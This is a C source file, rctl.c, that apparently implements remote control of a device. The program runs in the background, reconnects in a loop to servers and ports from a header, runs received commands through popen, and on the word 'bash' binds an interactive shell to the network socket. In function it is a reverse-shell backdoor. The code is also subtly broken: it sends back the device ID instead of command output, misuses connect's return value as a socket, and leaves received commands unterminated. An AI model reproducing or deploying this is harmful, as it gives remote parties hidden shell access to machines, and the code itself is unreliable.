/*
 * ============================================================================
 *
 *       Filename:  rctl.c
 *
 *    Description:  
 *
 *        Version:  1.0
 *        Created:  2014年09月28日 11时02分55秒
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  jianxi sun (jianxi), ycsunjane@gmail.com
 *   Organization:  
 *
 * ============================================================================
 */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/wait.h>

#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#include "rctl.h"

static int get_cmd_stdout(char *cmd, char *buf, int len)
{
	FILE *fp;
	int size;
	fp = popen(cmd, "r"); 
	if(fp != NULL) {
		size = fread(buf, 1, len, fp);
		if(size <= 0)
			goto err;

		/* skip \n */
		buf[size - 1] = 0;
		pclose(fp);
		return size-1;
	}
err:
	buf[0] = 0;
	return 0;
}

static in_addr_t r_server(int num)
{
	struct hostent *host;
	host = gethostbyname(serverip[num]);
	if(host != NULL && host->h_length > 0) {
		fprintf(stderr, "Try connect: %s\n", serverip[num]);
		return *(in_addr_t *)host->h_addr_list[0];
	}
	fprintf(stderr, "Can not get: %s\n", serverip[num]);
	return 0;
}

static int count = 0;
static int r_connect()
{
	fprintf(stderr, "Trying %d ... ...\n", count++);
	int fd = socket(AF_INET, SOCK_STREAM, 0);
	if(fd < 0) {
		fprintf(stderr, "Create socket failed: %s\n", 
			strerror(errno));
		return -1;
	}

	struct sockaddr_in addr;

	int i, j, sock;
	in_addr_t server;

	for(i = 0; i < TOTSER; i++) {
		socklen_t addr_len = sizeof(addr);
		addr.sin_family = AF_INET;
		server = r_server(i);
		if(!server) continue;

		addr.sin_addr.s_addr = server;
		for(j = 0; j < TOTPRT; j++) {
			addr.sin_port = htons(port[j]);
			fprintf(stderr, "Try %s port: %d\n", 
				inet_ntoa(addr.sin_addr), port[j]);
			sock = connect(fd, (void *)&addr, addr_len);
			if(sock >= 0) {
				fprintf(stderr, "connect success\n");
				return sock;
			}
			fprintf(stderr, "connect failed\n");
		}
	}
	return -1;
}

static void bash(int fd)
{
	pid_t pid;
	if( (pid = fork()) != 0) {
		wait(NULL);
		return;
	}

	close(0);
	close(1);
	close(2);

	dup2(fd, 0);
	dup2(fd, 1);
	dup2(fd, 2);

	int ret;
	ret = execlp("sh", "sh", "-i", NULL);
	if(ret < 0) {
		fprintf(stderr, "Execlp failed: %s\n", 
			strerror(errno));
		exit(-1);
	}
	exit(0);
}

#define CMDLEN (2048)
#define BUFLEN (2048)
static char cmd[CMDLEN];
static char buf[BUFLEN];

void rctl(char *devid)
{
	if(fork() != 0)
		return;

	int fd = 0;
reconnect:
	close(fd);
	fd = r_connect();
	if(fd == -1) goto reconnect;

	int ret;
	ret = send(fd, devid, strlen(devid), 0);
	if(ret < 0) {
		fprintf(stderr, "Send failed: %s(%d)\n", 
			strerror(errno), errno);
		goto reconnect;
	}

	while(1) {
		ret = recv(fd, cmd, CMDLEN, 0);
		if(ret < 0) {
			fprintf(stderr, "Recv failed: %s(%d)\n", 
				strerror(errno), errno);
			goto reconnect;
		}

		if(!strcmp(cmd, "bash")) {
			bash(fd);
			continue;
		}

		ret = get_cmd_stdout(cmd, buf, BUFLEN);
		if(ret <= 0)
			sprintf(buf, "Can not exec: %s\n", cmd);

		ret = send(fd, devid, strlen(devid), 0);
		if(ret < 0) {
			fprintf(stderr, "Send failed: %s(%d)\n", 
				strerror(errno), errno);
			goto reconnect;
		}
	}
}
